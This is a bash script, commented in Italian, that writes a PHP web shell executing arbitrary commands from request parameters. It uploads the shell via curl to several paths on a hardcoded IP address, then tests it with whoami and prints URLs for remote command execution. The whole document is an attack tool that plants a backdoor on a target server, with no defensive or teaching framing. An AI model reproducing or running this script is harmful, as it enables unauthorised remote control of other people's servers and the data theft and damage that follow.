#!/bin/bash
TARGET="63.164.100.214:9091"
SHELL_URL="http://$TARGET/shell.php"

echo "[+] Installando ROOT TERMINAL su $TARGET..."

# 1. UPLOAD WEBSHELL AVANZATA
cat > webshell.php << 'EOF'
<?php
session_start();
if(!isset($_SESSION['cmd'])) $_SESSION['cmd']="";
if(isset($_REQUEST['c'])){ 
    $_SESSION['cmd']=$_REQUEST['c'];
    $output=shell_exec($_REQUEST['c']." 2>&1");
    echo "<pre style='background:#000;color:lime;font-family:monospace;padding:10px;'>$output</pre>";
}
if(isset($_POST['cmd'])){ 
    $output=shell_exec($_POST['cmd']." 2>&1"); 
    echo nl2br($output); 
}
?>
<div style="background:#111;color:#0f0;padding:10px;font-family:monospace;">
<form method=POST>
<input name=cmd style="width:70%;background:#333;color:lime;border:1px solid #0f0;padding:5px;font-family:monospace;" value="<?=$_SESSION['cmd']?>" autofocus>
<input type=submit value="EXEC" style="background:#0f0;color:#000;padding:5px;">
</form>
<?php
echo "<small>ROOT SHELL: <a href='?c=whoami' target=_blank>whoami</a> | <a href='?c=id' target=_blank>id</a> | <a href='?c=uname -a' target=_blank>info</a></small>";
?>
</div>
EOF

# 2. UPLOAD
curl -s --data-binary @webshell.php "http://$TARGET/shell.php" > /dev/null
curl -s --data-binary @webshell.php "http://$TARGET/cmd.php" > /dev/null
curl -s --data-binary @webshell.php "http://$TARGET/root.php" > /dev/null

echo "[+] ✅ WEBSHELL UPLOADATA!"
echo "[+] 🌐 TERMINAL URL: http://$TARGET/shell.php"
echo "[+] 🖥️  ROOT COMMANDS:"
echo "    whoami → http://$TARGET/shell.php?c=whoami"
echo "    ls / → http://$TARGET/shell.php?c=ls+-la+/"
echo "    INTERACTIVE → http://$TARGET/shell.php (form bash)"

# 3. TEST AUTOMATICO
echo -e "\n[+] Test connessione..."
curl -s "http://$TARGET/shell.php?c=whoami" | grep -o '[a-z]*$' || echo "❌ Upload fallito, riprova"

echo -e "\n🚀 APRI BROWSER → http://$TARGET/shell.php\n"
